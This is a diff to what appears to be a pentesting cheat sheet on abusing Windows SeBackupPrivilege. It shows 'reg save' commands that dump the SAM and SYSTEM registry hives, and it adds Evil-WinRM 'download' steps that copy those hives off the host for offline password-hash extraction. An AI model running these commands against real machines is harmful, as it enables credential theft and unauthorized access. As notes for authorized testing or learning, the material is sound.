@@ -7,6 +7,10 @@ If an user has the SeBackupPrivilege enabled or is part of the Backup Operators 
 ## Registry Hive PoC
 
 ```
+reg save hklm\sam <path>
+```
+
+```
 reg save hklm\sam c:\Windows\Tasks\SAM
 ```
 
@@ -14,6 +18,18 @@ reg save hklm\sam c:\Windows\Tasks\SAM
 ```
 reg save hklm\system c:\Windows\Tasks\SYSTEM
 ```
+
+## Evil-WinRM
+
+```
+download SAM
+```
+
+```
+download SYSTEM
+```
+
+## Without Evil-WinRM
 
 On local machine:
 
